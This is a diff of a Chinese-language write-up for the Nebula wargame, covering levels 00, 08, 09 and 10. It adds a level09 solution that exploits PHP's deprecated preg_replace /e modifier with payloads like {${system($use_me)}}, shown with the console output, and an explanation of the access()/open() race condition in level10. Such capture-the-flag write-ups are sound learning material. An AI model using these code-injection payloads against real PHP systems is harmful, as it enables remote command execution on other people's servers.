@@ -3,7 +3,6 @@
 ## level00 -- 寻找SUID程序
 用`level00`账户登录，找出由`flag00`拥有的 Set User ID的程序
 
-### Solution
 要将错误结果送到/dev/null，不然出现很多 Permission denied, 会影响找到该程序。
 ```sh
 $ find / -user flag00 2>/dev/null
@@ -274,7 +273,10 @@ http://blog.yyx.me/posts/exploit-exercises-nebula-level-05-09.html
 所以最终结果拼凑起来就是： `backd00Rmate`
 然后以这个密码登录flag08帐号即可得到flag08的shell，然后getflag。
 
-## level09
+## level09(PHP 不熟)
+参考：
+https://lightless.me/archives/Nebula-writeup.html
+
 在/home/flag09目录下发现两个文件flag09 和flag09.php
 这段代码通过正则表达式匹配[email xxx@yyy]，将`.` 替换成 `dot`，将`@`替换成`AT`。
 在/tmp目录下建立一个文本文件cqq_email，内容为`[email 77caikiki@protonmail.com]`
@@ -286,5 +288,45 @@ http://blog.yyx.me/posts/exploit-exercises-nebula-level-05-09.html
 $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
 ```
 
+`preg_replace`中的`/e`参数用的不多，一般都是用`/i`(忽略大小写)。于是查PHP Manual, 得知e使得preg_replace第二个参数变成函数执行，就和执行eval一样，这个参数太危险了，在PHP 5.5.0之后废除改用回调函数( preg_repace_callback() )实现了。
 `preg_replace`第一个参数后使用了`/e`模式。如果启用这种模式，那么preg_replace的第二个参数将会被作为代码执行。之前ThinkPHP也出现了这种漏洞。
+
+构造payload：
+```
+[email {${phpinfo()}}]
+```
+成功执行。
+继续构造执行命令的payload。
+```
+[email {${system("getflag")}]
+```
+
+结果发现双引号被转义了，执行不了。
+```
+level09@nebula:/tmp$ /home/flag09/flag09 /tmp/phpinfo pwd
+PHP Parse error:  syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1
+PHP Fatal error:  preg_replace(): Failed evaluating code:
+spam("{${system(\'pwd\')}}") in /home/flag09/flag09.php on line 15
+```
+但是函数有一个$use_me 参数，看这个名字，应该算提示吧。
+于是，构造包含$use_me 的payload。
+```
+[email {${system($use_me)}}]
+```
+然后在命令行传入第二个参数(之前不是一直没用到这第二个参数吗？这次用到了)。
+```
+level09@nebula:/tmp$ /home/flag09/flag09 /tmp/phpinfo getflag
+You have successfully executed getflag on a target account
+PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
+```
+
+## level10 (Time of check, Time of use BUG)
+在分析前先弄明白两个东西，分别是 `Effective user ID(euid)` 和 `Real user ID(ruid)`。
+`ruid`的作用是`Identify the real user`, 而 `euid`的作用是 `Decides access level`。
+
+而这里的`access()`检查的是`ruid`，在`access()`检查和使用`open()`打开文件之间的这段时间里，
+我们完全可以替代掉打开的文件为`token`，因为我们已经通过了检查。
+也就是说，用一个有权限的文件去绕过`access`的限制，之后马上把文件替换成没有权限的`token`，因为已经
+经过了检查，所以程序可以毫无阻碍的打开没有权限的`token`文件。(在这个题中没有访问`token`文件的权限而`flag`就在`token`中)。
+
 
